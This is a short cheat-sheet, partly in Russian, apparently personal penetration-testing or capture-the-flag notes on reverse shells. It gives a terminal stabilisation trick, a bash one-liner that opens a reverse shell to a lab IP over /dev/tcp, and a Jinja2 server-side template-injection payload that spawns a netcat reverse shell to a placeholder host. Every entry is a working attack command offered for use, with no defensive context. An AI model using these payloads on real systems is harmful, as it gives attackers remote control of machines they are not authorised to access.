хороша стабилизация после установки реверсшела: 
```shell
# Нажми CTRL+Z, чтобы приостановить shell
stty raw -echo; fg
# нажми Enter
```
---
from Bash
```shell
bash -c "bash -i >& /dev/tcp/10.11.147.65/9000 0>&1"
```
---
for jinja2
```http
__import__('os').popen('rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/bash -i 2>&1 | nc YOUR_IP PORT > /tmp/f').read()
```
---
